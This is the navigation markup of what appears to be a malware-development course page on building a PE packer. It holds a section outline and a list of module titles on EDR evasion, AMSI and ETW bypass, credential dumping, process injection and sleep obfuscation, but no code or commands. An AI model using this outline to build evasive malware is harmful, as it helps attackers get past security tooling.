        <span class="text-gray-300 hover:text-white text-sm">The Lzw-Eddy Repository</span>
      </div>
      <div class="py-2 px-2 hover:bg-gray-600 cursor-pointer transition-colors" style="padding-left:80px" data-target-id="toc-heading-20">
        <span class="text-gray-300 hover:text-white text-sm">LzwCompressData Function</span>
      </div>
      <div class="py-2 px-2 hover:bg-gray-600 cursor-pointer transition-colors" style="padding-left:80px" data-target-id="toc-heading-21">
        <span class="text-gray-300 hover:text-white text-sm">LzwDecompressData Function</span>
      </div>
      <div class="py-2 px-2 hover:bg-gray-600 cursor-pointer transition-colors" style="padding-left:60px" data-target-id="toc-heading-22">
        <span class="text-gray-300 hover:text-white text-sm">PeCompressor Program</span>
      </div>
      <div class="py-2 px-2 hover:bg-gray-600 cursor-pointer transition-colors" style="padding-left:60px" data-target-id="toc-heading-23">
        <span class="text-gray-300 hover:text-white text-sm">Payload Placement</span>
      </div>
      <div class="py-2 px-2 hover:bg-gray-600 cursor-pointer transition-colors" style="padding-left:60px" data-target-id="toc-heading-24">
        <span class="text-gray-300 hover:text-white text-sm">The GetDecompressedResourcePayload Function</span>
      </div>
      <div class="py-2 px-2 hover:bg-gray-600 cursor-pointer transition-colors" style="padding-left:80px" data-target-id="toc-heading-25">
        <span class="text-gray-300 hover:text-white text-sm">GetResourceData Helper Function</span>
      </div>
      <div class="py-2 px-2 hover:bg-gray-600 cursor-pointer transition-colors" style="padding-left:60px" data-target-id="toc-heading-26">
        <span class="text-gray-300 hover:text-white text-sm">The Main Function</span>
      </div>
      <div class="py-2 px-2 hover:bg-gray-600 cursor-pointer transition-colors" style="padding-left:80px" data-target-id="toc-heading-27">
        <span class="text-gray-300 hover:text-white text-sm">The AddWin32uToIat Function - Loading win32u.dll</span>
      </div>
      <div class="py-2 px-2 hover:bg-gray-600 cursor-pointer transition-colors" style="padding-left:60px" data-target-id="toc-heading-28">
        <span class="text-gray-300 hover:text-white text-sm">CRT Library Function Replacement</span>
      </div>
      <div class="py-2 px-2 hover:bg-gray-600 cursor-pointer transition-colors" style="padding-left:80px" data-target-id="toc-heading-29">
        <span class="text-gray-300 hover:text-white text-sm">Replacing rand()</span>
      </div>
      <div class="py-2 px-2 hover:bg-gray-600 cursor-pointer transition-colors" style="padding-left:60px" data-target-id="toc-heading-30">
        <span class="text-gray-300 hover:text-white text-sm">Replacing wcscat()</span>
      </div>
      <div class="py-2 px-2 hover:bg-gray-600 cursor-pointer transition-colors" style="padding-left:60px" data-target-id="toc-heading-31">
        <span class="text-gray-300 hover:text-white text-sm">Replacing memcpy</span>
      </div>
      <div class="py-2 px-2 hover:bg-gray-600 cursor-pointer transition-colors" style="padding-left:60px" data-target-id="toc-heading-32">
        <span class="text-gray-300 hover:text-white text-sm">Intrinsic Functions</span>
      </div>
      <div class="py-2 px-2 hover:bg-gray-600 cursor-pointer transition-colors" style="padding-left:60px" data-target-id="toc-heading-33">
        <span class="text-gray-300 hover:text-white text-sm">IAT Camouflage</span>
      </div>
      <div class="py-2 px-2 hover:bg-gray-600 cursor-pointer transition-colors" style="padding-left:60px" data-target-id="toc-heading-34">
        <span class="text-gray-300 hover:text-white text-sm">Demo</span>
      </div></div>
    </div>
    </div>

        <script>
    // If ToC starts open, build it once the DOM is ready
    document.addEventListener('DOMContentLoaded', function () {
        var el = document.getElementById('toc-content');
        if (el && !el.innerHTML.trim() && typeof extractHeadings === 'function') {
        extractHeadings();
        }
    });
    </script>
    
    <div id="maldevDB" class="hidden p-4 border-r border-b border-gray-600 font-code w-full h-full">
        <img class="w-[500px] mb-4" src="31_files/maldev-db-logo.png">
        <form id="searchForm" class="flex flex-col items-center justify-center w-full font-mono">
            <div class="relative flex w-full border border-solid border-gray-700 rounded-3xl">
            <i class="absolute fa fa-search text-gray-400 top-[14px] left-4 z-20"></i>
            <input placeholder="Search Maldev Database" type="search" name="q" autocomplete="off" id="searchInput" maxlength="85" class="relative m-0 -mr-0.5 h-[46px] w-full rounded-l-3xl  bg-transparent px-10 py-[0.25rem] font-normal leading-[1.6] text-white outline-none focus:bg-gray-800 focus:border-r focus:border-gray-700" aria-label="Search">
                <button class=" w-[70px] bg-gray-800 flex items-center justify-center rounded-r-3xl px-6 py-2.5 text-white hover:bg-gray-700" type="submit">
                    <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 20 20" fill="currentColor" class="h-5 w-5" style="--darkreader-inline-fill: currentColor;" data-darkreader-inline-fill="">
                    <path fill-rule="evenodd" d="M9 3.5a5.5 5.5 0 100 11 5.5 5.5 0 000-11zM2 9a7 7 0 1112.452 4.391l3.328 3.329a.75.75 0 11-1.06 1.06l-3.329-3.328A7 7 0 012 9z" clip-rule="evenodd"></path>
                    </svg>
                </button>
            </div>
            <div class="relative inline-block text-sm w-full md:w-fit">
                <select id="languageSelect" name="language" class="border rounded-md p-2.5 bg-gray-800 border-gray-600 placeholder-gray-400 text-white outline-none appearance-none w-full pr-8 my-4">
                    <option value="all" selected="selected">All languages</option>
                    <option value="c">C</option>
                    <option value="cpp">C++</option>
                    <option value="python">Python</option>
                    <option value="nim">Nim</option>
                    <option value="rust">Rust</option>
                    
                </select>
                <div class="absolute inset-y-0 right-0 flex items-center px-2 pointer-events-none">
                    <svg class="h-4 w-4 text-gray-700" fill="#fff" xmlns="http://www.w3.org/2000/svg" viewBox="0 0 20 20" style="--darkreader-inline-fill: var(--darkreader-text-ffffff, #e8e6e3);" data-darkreader-inline-fill="">
                        <path d="M5.516 7.548c.436-.446 1.045-.481 1.576 0L10 10.405l2.908-2.857c.531-.481 1.141-.446 1.576 0 .436.445.408 1.197 0 1.643l-3.564 3.642c-.214.223-.502.335-.92.335s-.707-.112-.92-.335l-3.564-3.642c-.408-.446-.436-1.198 0-1.643z"></path>
                    </svg>
                </div>
            </div>
        </form>
        <div class="resultsWrapper">
            <div id="noResults" class="flex flex-col justify-center items-center hidden">
                <div class="text-white text-sm opacity-50 w-full text-center font-mono mt-4">
                    No results found.
                </div>
            </div>
            <div id="rateLimited" class="flex flex-col justify-center items-center hidden">
                <div class="text-white text-sm opacity-50 w-full text-center font-mono mt-4">
                    HTTP 429 - You have been rate limited.
                </div>
            </div>

            <!-- Results here -->

            <div class="flex justify-center mt-6">
                <button id="loadMore" class="hidden bg-blue-700 text-white px-4 py-2 rounded hover:bg-blue-600 font-mono text-sm">
                    Load More
                </button>
            </div>
        </div>
    </div>
</div>
<div id="progress-container" class="hidden flex-col lg:min-w-[500px]">
    <div id="progress" class="p-4 border-r overflow-auto border-b border-gray-600 font-code w-full min-h-full">
    <div class="max-h-[300px]">
                <div class="w-full bg-gray-700 text-center mb-4 font-sans text-lg">New Modules Progress</div>
                                    <div class="flex items-center mb-2 font-sans">
                <input type="checkbox" id="module-1" class="flex-none outline-none accent-green-500 w-4 h-4 text-blue-600 bg-gray-100 rounded border-gray-300" checked="checked" onclick="return false;">
                <a data-target="_self" href="./1.html&amp;toc=true">
                    <div for="module-1" class="ml-2 text-sm font-medium 
                                text-gray-900 dark:text-gray-300">
                        Module 1 - Binary Metadata Modification
                    </div>
                </a>
            </div>
                                <div class="flex items-center mb-2 font-sans">
                <input type="checkbox" id="module-2" class="flex-none outline-none accent-green-500 w-4 h-4 text-blue-600 bg-gray-100 rounded border-gray-300" checked="checked" onclick="return false;">
                <a data-target="_self" href="./2.html&amp;toc=true">
                    <div for="module-2" class="ml-2 text-sm font-medium 
                                text-gray-900 dark:text-gray-300">
                        Module 2 - Thread Enumeration - NtQuerySystemInformation
                    </div>
                </a>
            </div>
                                <div class="flex items-center mb-2 font-sans">
                <input type="checkbox" id="module-3" class="flex-none outline-none accent-green-500 w-4 h-4 text-blue-600 bg-gray-100 rounded border-gray-300" checked="checked" onclick="return false;">
                <a data-target="_self" href="./3.html&amp;toc=true">
                    <div for="module-3" class="ml-2 text-sm font-medium 
                                text-gray-900 dark:text-gray-300">
                        Module 3 - Custom WinAPI Functions
                    </div>
                </a>
            </div>
                                <div class="flex items-center mb-2 font-sans">
                <input type="checkbox" id="module-4" class="flex-none outline-none accent-green-500 w-4 h-4 text-blue-600 bg-gray-100 rounded border-gray-300" checked="checked" onclick="return false;">
                <a data-target="_self" href="./4.html&amp;toc=true">
                    <div for="module-4" class="ml-2 text-sm font-medium 
                                text-gray-900 dark:text-gray-300">
                        Module 4 - Exploiting EDRs For Evasion
                    </div>
                </a>
            </div>
                                <div class="flex items-center mb-2 font-sans">
                <input type="checkbox" id="module-5" class="flex-none outline-none accent-green-500 w-4 h-4 text-blue-600 bg-gray-100 rounded border-gray-300" checked="checked" onclick="return false;">
                <a data-target="_self" href="./5.html&amp;toc=true">
                    <div for="module-5" class="ml-2 text-sm font-medium 
                                text-gray-900 dark:text-gray-300">
                        Module 5 - Introduction To MASM Assembly
                    </div>
                </a>
            </div>
                                <div class="flex items-center mb-2 font-sans">
                <input type="checkbox" id="module-6" class="flex-none outline-none accent-green-500 w-4 h-4 text-blue-600 bg-gray-100 rounded border-gray-300" checked="checked" onclick="return false;">
                <a data-target="_self" href="./6.html&amp;toc=true">
                    <div for="module-6" class="ml-2 text-sm font-medium 
                                text-gray-900 dark:text-gray-300">
                        Module 6 - Evasion With File Bloating
                    </div>
                </a>
            </div>
                                <div class="flex items-center mb-2 font-sans">
                <input type="checkbox" id="module-7" class="flex-none outline-none accent-green-500 w-4 h-4 text-blue-600 bg-gray-100 rounded border-gray-300" checked="checked" onclick="return false;">
                <a data-target="_self" href="./7.html&amp;toc=true">
                    <div for="module-7" class="ml-2 text-sm font-medium 
                                text-gray-900 dark:text-gray-300">
                        Module 7 - Bring Your Own Protocol Handler
                    </div>
                </a>
            </div>
                                <div class="flex items-center mb-2 font-sans">
                <input type="checkbox" id="module-8" class="flex-none outline-none accent-green-500 w-4 h-4 text-blue-600 bg-gray-100 rounded border-gray-300" checked="checked" onclick="return false;">
                <a data-target="_self" href="./8.html&amp;toc=true">
                    <div for="module-8" class="ml-2 text-sm font-medium 
                                text-gray-900 dark:text-gray-300">
                        Module 8 - Bring Your Own File Extension
                    </div>
                </a>
            </div>
                                <div class="flex items-center mb-2 font-sans">
                <input type="checkbox" id="module-9" class="flex-none outline-none accent-green-500 w-4 h-4 text-blue-600 bg-gray-100 rounded border-gray-300" checked="checked" onclick="return false;">
                <a data-target="_self" href="./9.html&amp;toc=true">
                    <div for="module-9" class="ml-2 text-sm font-medium 
                                text-gray-900 dark:text-gray-300">
                        Module 9 - Utilizing Hardware Breakpoints For Hooking (1)
                    </div>
                </a>
            </div>
                                <div class="flex items-center mb-2 font-sans">
                <input type="checkbox" id="module-10" class="flex-none outline-none accent-green-500 w-4 h-4 text-blue-600 bg-gray-100 rounded border-gray-300" checked="checked" onclick="return false;">
                <a data-target="_self" href="./10.html&amp;toc=true">
                    <div for="module-10" class="ml-2 text-sm font-medium 
                                text-gray-900 dark:text-gray-300">
                        Module 10 - Utilizing Hardware Breakpoints For Hooking (2)
                    </div>
                </a>
            </div>
                                <div class="flex items-center mb-2 font-sans">
                <input type="checkbox" id="module-11" class="flex-none outline-none accent-green-500 w-4 h-4 text-blue-600 bg-gray-100 rounded border-gray-300" checked="checked" onclick="return false;">
                <a data-target="_self" href="./11.html&amp;toc=true">
                    <div for="module-11" class="ml-2 text-sm font-medium 
                                text-gray-900 dark:text-gray-300">
                        Module 11 - Utilizing Hardware Breakpoints For Credential Dumping
                    </div>
                </a>
            </div>
                                <div class="flex items-center mb-2 font-sans">
                <input type="checkbox" id="module-12" class="flex-none outline-none accent-green-500 w-4 h-4 text-blue-600 bg-gray-100 rounded border-gray-300" checked="checked" onclick="return false;">
                <a data-target="_self" href="./12.html&amp;toc=true">
                    <div for="module-12" class="ml-2 text-sm font-medium 
                                text-gray-900 dark:text-gray-300">
                        Module 12 - Event Tracing For Windows - Introduction
                    </div>
                </a>
            </div>
                                <div class="flex items-center mb-2 font-sans">
                <input type="checkbox" id="module-13" class="flex-none outline-none accent-green-500 w-4 h-4 text-blue-600 bg-gray-100 rounded border-gray-300" checked="checked" onclick="return false;">
                <a data-target="_self" href="./13.html&amp;toc=true">
                    <div for="module-13" class="ml-2 text-sm font-medium 
                                text-gray-900 dark:text-gray-300">
                        Module 13 - Event Tracing For Windows - ETW Tools
                    </div>
                </a>
            </div>
                                <div class="flex items-center mb-2 font-sans">
                <input type="checkbox" id="module-14" class="flex-none outline-none accent-green-500 w-4 h-4 text-blue-600 bg-gray-100 rounded border-gray-300" checked="checked" onclick="return false;">
                <a data-target="_self" href="./14.html&amp;toc=true">
                    <div for="module-14" class="ml-2 text-sm font-medium 
                                text-gray-900 dark:text-gray-300">
                        Module 14 - Event Tracing For Windows - ETW Bypass Via Byte Patching
                    </div>
                </a>
            </div>
                                <div class="flex items-center mb-2 font-sans">
                <input type="checkbox" id="module-15" class="flex-none outline-none accent-green-500 w-4 h-4 text-blue-600 bg-gray-100 rounded border-gray-300" checked="checked" onclick="return false;">
                <a data-target="_self" href="./15.html&amp;toc=true">
                    <div for="module-15" class="ml-2 text-sm font-medium 
                                text-gray-900 dark:text-gray-300">
                        Module 15 - Event Tracing for Windows - Improved Patching
                    </div>
                </a>
            </div>
                                <div class="flex items-center mb-2 font-sans">
                <input type="checkbox" id="module-16" class="flex-none outline-none accent-green-500 w-4 h-4 text-blue-600 bg-gray-100 rounded border-gray-300" checked="checked" onclick="return false;">
                <a data-target="_self" href="./16.html&amp;toc=true">
                    <div for="module-16" class="ml-2 text-sm font-medium 
                                text-gray-900 dark:text-gray-300">
                        Module 16 - Event Tracing for Windows - Patchless ETW Bypass Via HBPs
                    </div>
                </a>
            </div>
                                <div class="flex items-center mb-2 font-sans">
                <input type="checkbox" id="module-17" class="flex-none outline-none accent-green-500 w-4 h-4 text-blue-600 bg-gray-100 rounded border-gray-300" checked="checked" onclick="return false;">
                <a data-target="_self" href="./17.html&amp;toc=true">
                    <div for="module-17" class="ml-2 text-sm font-medium 
                                text-gray-900 dark:text-gray-300">
                        Module 17 - Event Tracing For Windows - ETW Provider Session Hijacking
                    </div>
                </a>
            </div>
                                <div class="flex items-center mb-2 font-sans">
                <input type="checkbox" id="module-18" class="flex-none outline-none accent-green-500 w-4 h-4 text-blue-600 bg-gray-100 rounded border-gray-300" checked="checked" onclick="return false;">
                <a data-target="_self" href="./18.html&amp;toc=true">
                    <div for="module-18" class="ml-2 text-sm font-medium 
                                text-gray-900 dark:text-gray-300">
                        Module 18 - Antimalware Scan Interface - Introduction
                    </div>
                </a>
            </div>
                                <div class="flex items-center mb-2 font-sans">
                <input type="checkbox" id="module-19" class="flex-none outline-none accent-green-500 w-4 h-4 text-blue-600 bg-gray-100 rounded border-gray-300" checked="checked" onclick="return false;">
                <a data-target="_self" href="./19.html&amp;toc=true">
                    <div for="module-19" class="ml-2 text-sm font-medium 
                                text-gray-900 dark:text-gray-300">
                        Module 19 - Antimalware Scan Interface - AMSI Bypass Via Byte Patching
                    </div>
                </a>
            </div>
                                <div class="flex items-center mb-2 font-sans">
                <input type="checkbox" id="module-20" class="flex-none outline-none accent-green-500 w-4 h-4 text-blue-600 bg-gray-100 rounded border-gray-300" checked="checked" onclick="return false;">
                <a data-target="_self" href="./20.html&amp;toc=true">
                    <div for="module-20" class="ml-2 text-sm font-medium 
                                text-gray-900 dark:text-gray-300">
                        Module 20 - Antimalware Scan Interface - AMSI Bypass Via HBPs
                    </div>
                </a>
            </div>
                                <div class="flex items-center mb-2 font-sans">
                <input type="checkbox" id="module-21" class="flex-none outline-none accent-green-500 w-4 h-4 text-blue-600 bg-gray-100 rounded border-gray-300" checked="checked" onclick="return false;">
                <a data-target="_self" href="./21.html&amp;toc=true">
                    <div for="module-21" class="ml-2 text-sm font-medium 
                                text-gray-900 dark:text-gray-300">
                        Module 21 - Building a DRM-equipped Malware
                    </div>
                </a>
            </div>
                                <div class="flex items-center mb-2 font-sans">
                <input type="checkbox" id="module-22" class="flex-none outline-none accent-green-500 w-4 h-4 text-blue-600 bg-gray-100 rounded border-gray-300" checked="checked" onclick="return false;">
                <a data-target="_self" href="./22.html&amp;toc=true">
                    <div for="module-22" class="ml-2 text-sm font-medium 
                                text-gray-900 dark:text-gray-300">
                        Module 22 - Introduction to Havoc C&amp;C
                    </div>
                </a>
            </div>
                                <div class="flex items-center mb-2 font-sans">
                <input type="checkbox" id="module-23" class="flex-none outline-none accent-green-500 w-4 h-4 text-blue-600 bg-gray-100 rounded border-gray-300" checked="checked" onclick="return false;">
                <a data-target="_self" href="./23.html&amp;toc=true">
                    <div for="module-23" class="ml-2 text-sm font-medium 
                                text-gray-900 dark:text-gray-300">
                        Module 23 - Building An Evasive DLL Payload Loader
                    </div>
                </a>
            </div>
                                <div class="flex items-center mb-2 font-sans">
                <input type="checkbox" id="module-24" class="flex-none outline-none accent-green-500 w-4 h-4 text-blue-600 bg-gray-100 rounded border-gray-300" checked="checked" onclick="return false;">
                <a data-target="_self" href="./24.html&amp;toc=true">
                    <div for="module-24" class="ml-2 text-sm font-medium 
                                text-gray-900 dark:text-gray-300">
                        Module 24 - Introduction To DLL Sideloading
                    </div>
                </a>
            </div>
                                <div class="flex items-center mb-2 font-sans">
                <input type="checkbox" id="module-25" class="flex-none outline-none accent-green-500 w-4 h-4 text-blue-600 bg-gray-100 rounded border-gray-300" checked="checked" onclick="return false;">
                <a data-target="_self" href="./25.html&amp;toc=true">
                    <div for="module-25" class="ml-2 text-sm font-medium 
                                text-gray-900 dark:text-gray-300">
                        Module 25 - Practical DLL Sideloading Example
                    </div>
                </a>
            </div>
                                <div class="flex items-center mb-2 font-sans">
                <input type="checkbox" id="module-26" class="flex-none outline-none accent-green-500 w-4 h-4 text-blue-600 bg-gray-100 rounded border-gray-300" checked="checked" onclick="return false;">
                <a data-target="_self" href="./26.html&amp;toc=true">
                    <div for="module-26" class="ml-2 text-sm font-medium 
                                text-gray-900 dark:text-gray-300">
                        Module 26 - DLL Sideloading For EDR Evasion
                    </div>
                </a>
            </div>
                                <div class="flex items-center mb-2 font-sans">
                <input type="checkbox" id="module-27" class="flex-none outline-none accent-green-500 w-4 h-4 text-blue-600 bg-gray-100 rounded border-gray-300" onclick="return false;">
                <a data-target="_self" href="./27.html&amp;toc=true">
                    <div for="module-27" class="ml-2 text-sm font-medium 
                                text-gray-900 dark:text-gray-300">
                        Module 27 - Bring Your Own Vulnerable Driver
                    </div>
                </a>
            </div>
                                <div class="flex items-center mb-2 font-sans">
                <input type="checkbox" id="module-28" class="flex-none outline-none accent-green-500 w-4 h-4 text-blue-600 bg-gray-100 rounded border-gray-300" checked="checked" onclick="return false;">
                <a data-target="_self" href="./28.html&amp;toc=true">
                    <div for="module-28" class="ml-2 text-sm font-medium 
                                text-gray-900 dark:text-gray-300">
                        Module 28 - Local PE Injection
                    </div>
                </a>
            </div>
                                <div class="flex items-center mb-2 font-sans">
                <input type="checkbox" id="module-29" class="flex-none outline-none accent-green-500 w-4 h-4 text-blue-600 bg-gray-100 rounded border-gray-300" checked="checked" onclick="return false;">
                <a data-target="_self" href="./29.html&amp;toc=true">
                    <div for="module-29" class="ml-2 text-sm font-medium 
                                text-gray-900 dark:text-gray-300">
                        Module 29 - Reflective DLL Injection
                    </div>
                </a>
            </div>
                                <div class="flex items-center mb-2 font-sans">
                <input type="checkbox" id="module-30" class="flex-none outline-none accent-green-500 w-4 h-4 text-blue-600 bg-gray-100 rounded border-gray-300" checked="checked" onclick="return false;">
                <a data-target="_self" href="./30.html&amp;toc=true">
                    <div for="module-30" class="ml-2 text-sm font-medium 
                                text-gray-900 dark:text-gray-300">
                        Module 30 - PeFluctuation
                    </div>
                </a>
            </div>
                                <div class="flex items-center mb-2 font-sans">
                <input type="checkbox" id="module-31" class="flex-none outline-none accent-green-500 w-4 h-4 text-blue-600 bg-gray-100 rounded border-gray-300" onclick="return false;">
                <a data-target="_self" href="./31.html&amp;toc=true">
                    <div for="module-31" class="ml-2 text-sm font-medium 
                                bg-blue-700 font-bold rounded-sm">
                        Module 31 - Building a PE Packer
                    </div>
                </a>
            </div>
                                <div class="flex items-center mb-2 font-sans">
                <input type="checkbox" id="module-32" class="flex-none outline-none accent-green-500 w-4 h-4 text-blue-600 bg-gray-100 rounded border-gray-300" onclick="return false;">
                <a data-target="_self" href="./32.html&amp;toc=true">
                    <div for="module-32" class="ml-2 text-sm font-medium 
                                text-gray-900 dark:text-gray-300">
                        Module 32 - Malware Directory Placement
                    </div>
                </a>
            </div>
                                <div class="flex items-center mb-2 font-sans">
                <input type="checkbox" id="module-33" class="flex-none outline-none accent-green-500 w-4 h-4 text-blue-600 bg-gray-100 rounded border-gray-300" onclick="return false;">
                <a data-target="_self" href="./33.html&amp;toc=true">
                    <div for="module-33" class="ml-2 text-sm font-medium 
                                text-gray-900 dark:text-gray-300">
                        Module 33 - Utilizing Fibers For Payload Execution
                    </div>
                </a>
            </div>
                                <div class="flex items-center mb-2 font-sans">
                <input type="checkbox" id="module-34" class="flex-none outline-none accent-green-500 w-4 h-4 text-blue-600 bg-gray-100 rounded border-gray-300" onclick="return false;">
                <a data-target="_self" href="./34.html&amp;toc=true">
                    <div for="module-34" class="ml-2 text-sm font-medium 
                                text-gray-900 dark:text-gray-300">
                        Module 34 - TLS Callbacks For Anti-Debugging
                    </div>
                </a>
            </div>
                                <div class="flex items-center mb-2 font-sans">
                <input type="checkbox" id="module-35" class="flex-none outline-none accent-green-500 w-4 h-4 text-blue-600 bg-gray-100 rounded border-gray-300" onclick="return false;">
                <a data-target="_self" href="./35.html&amp;toc=true">
                    <div for="module-35" class="ml-2 text-sm font-medium 
                                text-gray-900 dark:text-gray-300">
                        Module 35 - Threadless Injection
                    </div>
                </a>
            </div>
                                <div class="flex items-center mb-2 font-sans">
                <input type="checkbox" id="module-36" class="flex-none outline-none accent-green-500 w-4 h-4 text-blue-600 bg-gray-100 rounded border-gray-300" onclick="return false;">
                <a data-target="_self" href="./36.html&amp;toc=true">
                    <div for="module-36" class="ml-2 text-sm font-medium 
                                text-gray-900 dark:text-gray-300">
                        Module 36 - Module Stomping
                    </div>
                </a>
            </div>
                                <div class="flex items-center mb-2 font-sans">
                <input type="checkbox" id="module-37" class="flex-none outline-none accent-green-500 w-4 h-4 text-blue-600 bg-gray-100 rounded border-gray-300" onclick="return false;">
                <a data-target="_self" href="./37.html&amp;toc=true">
                    <div for="module-37" class="ml-2 text-sm font-medium 
                                text-gray-900 dark:text-gray-300">
                        Module 37 - Module Overloading
                    </div>
                </a>
            </div>
                                <div class="flex items-center mb-2 font-sans">
                <input type="checkbox" id="module-38" class="flex-none outline-none accent-green-500 w-4 h-4 text-blue-600 bg-gray-100 rounded border-gray-300" onclick="return false;">
                <a data-target="_self" href="./38.html&amp;toc=true">
                    <div for="module-38" class="ml-2 text-sm font-medium 
                                text-gray-900 dark:text-gray-300">
                        Module 38 - Process Hollowing
                    </div>
                </a>
            </div>
                                <div class="flex items-center mb-2 font-sans">
                <input type="checkbox" id="module-39" class="flex-none outline-none accent-green-500 w-4 h-4 text-blue-600 bg-gray-100 rounded border-gray-300" onclick="return false;">
                <a data-target="_self" href="./39.html&amp;toc=true">
                    <div for="module-39" class="ml-2 text-sm font-medium 
                                text-gray-900 dark:text-gray-300">
                        Module 39 - Ghost Process Injection
                    </div>
                </a>
            </div>
                                <div class="flex items-center mb-2 font-sans">
                <input type="checkbox" id="module-40" class="flex-none outline-none accent-green-500 w-4 h-4 text-blue-600 bg-gray-100 rounded border-gray-300" onclick="return false;">
                <a data-target="_self" href="./40.html&amp;toc=true">
                    <div for="module-40" class="ml-2 text-sm font-medium 
                                text-gray-900 dark:text-gray-300">
                        Module 40 - Ghostly Hollowing
                    </div>
                </a>
            </div>
                                <div class="flex items-center mb-2 font-sans">
                <input type="checkbox" id="module-41" class="flex-none outline-none accent-green-500 w-4 h-4 text-blue-600 bg-gray-100 rounded border-gray-300" onclick="return false;">
                <a data-target="_self" href="./41.html&amp;toc=true">
                    <div for="module-41" class="ml-2 text-sm font-medium 
                                text-gray-900 dark:text-gray-300">
                        Module 41 - Herpaderping Process Injection
                    </div>
                </a>
            </div>
                                <div class="flex items-center mb-2 font-sans">
                <input type="checkbox" id="module-42" class="flex-none outline-none accent-green-500 w-4 h-4 text-blue-600 bg-gray-100 rounded border-gray-300" onclick="return false;">
                <a data-target="_self" href="./42.html&amp;toc=true">
                    <div for="module-42" class="ml-2 text-sm font-medium 
                                text-gray-900 dark:text-gray-300">
                        Module 42 - Herpaderply Hollowing
                    </div>
                </a>
            </div>
                                <div class="flex items-center mb-2 font-sans">
                <input type="checkbox" id="module-43" class="flex-none outline-none accent-green-500 w-4 h-4 text-blue-600 bg-gray-100 rounded border-gray-300" onclick="return false;">
                <a data-target="_self" href="./43.html&amp;toc=true">
                    <div for="module-43" class="ml-2 text-sm font-medium 
                                text-gray-900 dark:text-gray-300">
                        Module 43 - Shellcode Reflective DLL Injection (sRDI)
                    </div>
                </a>
            </div>
                                <div class="flex items-center mb-2 font-sans">
                <input type="checkbox" id="module-44" class="flex-none outline-none accent-green-500 w-4 h-4 text-blue-600 bg-gray-100 rounded border-gray-300" onclick="return false;">
                <a data-target="_self" href="./44.html&amp;toc=true">
                    <div for="module-44" class="ml-2 text-sm font-medium 
                                text-gray-900 dark:text-gray-300">
                        Module 44 - Patchless Threadless Injection Via Hardware BreakPoints
                    </div>
                </a>
            </div>
                                <div class="flex items-center mb-2 font-sans">
                <input type="checkbox" id="module-45" class="flex-none outline-none accent-green-500 w-4 h-4 text-blue-600 bg-gray-100 rounded border-gray-300" onclick="return false;">
                <a data-target="_self" href="./45.html&amp;toc=true">
                    <div for="module-45" class="ml-2 text-sm font-medium 
                                text-gray-900 dark:text-gray-300">
                        Module 45 - Tampered Syscalls Via Hardware BreakPoints
                    </div>
                </a>
            </div>
                                <div class="flex items-center mb-2 font-sans">
                <input type="checkbox" id="module-46" class="flex-none outline-none accent-green-500 w-4 h-4 text-blue-600 bg-gray-100 rounded border-gray-300" onclick="return false;">
                <a data-target="_self" href="./46.html&amp;toc=true">
                    <div for="module-46" class="ml-2 text-sm font-medium 
                                text-gray-900 dark:text-gray-300">
                        Module 46 - Exploiting EDRs For Evasion - Preventing EDR From Taking Action
                    </div>
                </a>
            </div>
                                <div class="flex items-center mb-2 font-sans">
                <input type="checkbox" id="module-47" class="flex-none outline-none accent-green-500 w-4 h-4 text-blue-600 bg-gray-100 rounded border-gray-300" onclick="return false;">
                <a data-target="_self" href="./47.html&amp;toc=true">
                    <div for="module-47" class="ml-2 text-sm font-medium 
                                text-gray-900 dark:text-gray-300">
                        Module 47 - Exploiting EDRs For Evasion - EDR LOLBINS
                    </div>
                </a>
            </div>
                                <div class="flex items-center mb-2 font-sans">
                <input type="checkbox" id="module-48" class="flex-none outline-none accent-green-500 w-4 h-4 text-blue-600 bg-gray-100 rounded border-gray-300" onclick="return false;">
                <a data-target="_self" href="./48.html&amp;toc=true">
                    <div for="module-48" class="ml-2 text-sm font-medium 
                                text-gray-900 dark:text-gray-300">
                        Module 48 - Process Hypnosis
                    </div>
                </a>
            </div>
                                <div class="flex items-center mb-2 font-sans">
                <input type="checkbox" id="module-49" class="flex-none outline-none accent-green-500 w-4 h-4 text-blue-600 bg-gray-100 rounded border-gray-300" onclick="return false;">
                <a data-target="_self" href="./49.html&amp;toc=true">
                    <div for="module-49" class="ml-2 text-sm font-medium 
                                text-gray-900 dark:text-gray-300">
                        Module 49 - Introduction To Object Files
                    </div>
                </a>
            </div>
                                <div class="flex items-center mb-2 font-sans">
                <input type="checkbox" id="module-50" class="flex-none outline-none accent-green-500 w-4 h-4 text-blue-600 bg-gray-100 rounded border-gray-300" onclick="return false;">
                <a data-target="_self" href="./50.html&amp;toc=true">
                    <div for="module-50" class="ml-2 text-sm font-medium 
                                text-gray-900 dark:text-gray-300">
                        Module 50 - Writing Beacon Object Files
                    </div>
                </a>
            </div>
                                <div class="flex items-center mb-2 font-sans">
                <input type="checkbox" id="module-51" class="flex-none outline-none accent-green-500 w-4 h-4 text-blue-600 bg-gray-100 rounded border-gray-300" onclick="return false;">
                <a data-target="_self" href="./51.html&amp;toc=true">
                    <div for="module-51" class="ml-2 text-sm font-medium 
                                text-gray-900 dark:text-gray-300">
                        Module 51 - Object File Loading
                    </div>
                </a>
            </div>
                                <div class="flex items-center mb-2 font-sans">
                <input type="checkbox" id="module-52" class="flex-none outline-none accent-green-500 w-4 h-4 text-blue-600 bg-gray-100 rounded border-gray-300" onclick="return false;">
                <a data-target="_self" href="./52.html&amp;toc=true">
                    <div for="module-52" class="ml-2 text-sm font-medium 
                                text-gray-900 dark:text-gray-300">
                        Module 52 - Exploiting EDRs For Evasion - Finding Internal Exclusion List
                    </div>
                </a>
            </div>
                                <div class="flex items-center mb-2 font-sans">
                <input type="checkbox" id="module-53" class="flex-none outline-none accent-green-500 w-4 h-4 text-blue-600 bg-gray-100 rounded border-gray-300" onclick="return false;">
                <a data-target="_self" href="./53.html&amp;toc=true">
                    <div for="module-53" class="ml-2 text-sm font-medium 
                                text-gray-900 dark:text-gray-300">
                        Module 53 - Introduction To Sleep Obfuscation
                    </div>
                </a>
            </div>
                                <div class="flex items-center mb-2 font-sans">
                <input type="checkbox" id="module-54" class="flex-none outline-none accent-green-500 w-4 h-4 text-blue-600 bg-gray-100 rounded border-gray-300" onclick="return false;">
                <a data-target="_self" href="./54.html&amp;toc=true">
                    <div for="module-54" class="ml-2 text-sm font-medium 
                                text-gray-900 dark:text-gray-300">
                        Module 54 - Introduction to Ekko and Zilean Sleep Obfuscation
                    </div>
                </a>
            </div>
                                <div class="flex items-center mb-2 font-sans">
                <input type="checkbox" id="module-55" class="flex-none outline-none accent-green-500 w-4 h-4 text-blue-600 bg-gray-100 rounded border-gray-300" onclick="return false;">
